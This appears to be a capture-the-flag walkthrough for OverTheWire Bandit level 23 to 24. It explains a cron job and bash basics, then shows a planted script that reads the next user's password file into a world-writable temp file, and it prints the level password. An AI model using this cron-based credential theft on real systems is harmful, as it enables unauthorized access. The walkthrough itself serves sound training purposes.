# Bandit Level 23 -> Level 24

A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# /etc/cron.d/cronjob_bandit24

```console
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

# /usr/bin/cronjob_bandit24.sh

```console
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

1. cd to `/var/spool/$myname`
1. `for i in * .*;`: loop over all files in the current directory (_ for visible files, ._ for all hidden files),

Looping over hidden files

```console
jeremy@Jeremy-PC:~$ for i in .*; do echo "$i"; done
.
..
.bash_history
.bash_logout
.bashrc
.landscape
.lesshst
.local
.motd_shown
.profile
.ssh
.sudo_as_admin_successful
.viminfo
```

1. `if [ "$i" != "." -a "$i" != ".." ]`

   `[` is a symbolic link to the `test` program. It is a program and must be surrounded by spaces.

   `if [$foo = "bar" ]` will NOT WORK!

   From `man test`, `EXPRESSION1 -a EXPRESION2` means a test for both `EXPRESSION1` and `EXPRESION2`

   When considering directory names, a single dot (.) represents the current working directory, and two dots (..) denote the parent directory.

   A check is done to see if the current loop variable (`$i`) is not the current directory or the parent directory

`if statement syntax`

```shell
if [ ... ]
then
  # if-code
else
  # else-code
fi
```

`fi` is `if` backwards!

# If the current file (visible or hidden) is not the current directory or the parent directory

```console
echo "Handling $i"
owner="$(stat --format "%U" ./$i)"
if [ "${owner}" = "bandit23" ]; then
    timeout -s 9 60 ./$i
fi
rm -f ./$i
```

# `stat` command

Display file or file system status.

`-c, --format=FORMAT`: Use the specified `FORMAT` instead of the default

`%U` `FORMAT`: Username of owner

# File permissions (rwx)

1. Read (r)

   The read permission grants the ability to read a file. When set for a directory, this grants the ability to read the names of files in the directory, but not to find out any further information about them such as contents, the type, size, ownership and permissions.

1. Write (w)

   The write permission grants the ability to modify a file. When set for a directory, this allows for the modification of entries in the directory, which includes creating files, deleting files and renaming files. Note that this requires that execute is also set; without it, the write permission is meaningless for directories.

1. Execute (x)

   The execute permission grants the ability to execute a file. This permission must be set for executable programs, in order for the operating system to run them. When set for a directory, the execute permission is interpreted as the search permission: it grants the ability to access file contents and meta information if its name is known, but not list files inside the directory, unless read is set also.

# Command to execute

1. Create script (.sh) and place it in `/var/spool/bandit24` for execution.

   Obtain password from `/etc/bandit_pass/bandit24`, store it in tmp file, or else it will be deleted by the cronjob.

```console
bandit23@bandit:~$ mkdir /tmp/test
bandit23@bandit:~$ cd /tmp/test
bandit23@bandit:/tmp/test$ touch script.sh
bandit23@bandit:/tmp/test$ ls
script.sh
bandit23@bandit:/tmp/test$ vim script.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/test/password

bandit23@bandit:/tmp/test$ chmod +x script.sh
bandit23@bandit:/tmp/test$ ls -l
total 4
-rwxr-xr-x 1 bandit23 root 69 Jun 17 10:00 script.sh
bandit23@bandit:/tmp/test$ touch password
bandit23@bandit:/tmp/test$ chmod 666 password
bandit23@bandit:/tmp/test$ ls -l
total 4
-rw-rw-rw- 1 bandit23 root  0 Jun 17 10:07 password
-rwxr-xr-x 1 bandit23 root 65 Jun 17 10:02 script.sh

bandit23@bandit:/tmp/test$ cp script.sh /var/spool/bandit24/
bandit23@bandit:/tmp/test$ cat password
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

The password is stored in the file `password` after one minute.

# PASSWORD

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
